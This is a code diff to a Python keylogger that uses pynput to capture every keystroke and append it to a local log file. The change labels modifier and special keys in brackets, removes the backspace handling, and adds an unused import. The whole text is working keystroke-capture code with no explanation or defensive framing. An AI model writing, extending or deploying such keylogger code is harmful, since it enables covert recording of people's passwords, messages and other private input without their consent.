@@ -1,6 +1,8 @@
 import os
 from pynput.keyboard import Listener
 from datetime import datetime
+import termcolor
+
 
 def getfilepath():
     base = 'logs'
@@ -13,8 +15,9 @@ log_file = getfilepath()
 
 ################################################################################
 
-state = {'caps_lock':False, 'shift':True}
-
+state = {'caps_lock':False}
+special_key = ["Key.shift", "Key.caps_lock", "Key.alt_l", "Key.alt_gr", "Key.shift_r", 
+               "Key.ctrl_l", "Key.ctrl_r", "Key.esc"]
 def writeToFile(key):
     key = str(key)
 
@@ -31,23 +34,16 @@ def writeToFile(key):
         key = ' '
     if key == "Key.enter":
         key = '\n'
-    if key in ["Key.shift", "Key.caps_lock", "Key.alt_l", "Key.shift_r"]:
-        key = ''
     if key == "Key.tab":
         key = '  '
+    if key in special_key or key.startswith('Key'):
+        key = '[' + key.split('.')[1].upper() + ']'
+
     if state["caps_lock"]:
         key = key.upper()
-
-    if key == "Key.backspace":
-        with open(log_file, 'rb+') as file:
-            try:
-                file.seek(-1, 2)
-                file.truncate()
-            except OSError:
-                print("Document is empty.")
-    else:
-        with open(log_file, 'a') as file:
-            file.write(key)
+    
+    with open(log_file, 'a') as file:
+        file.write(key)
 
 ################################################################################
 
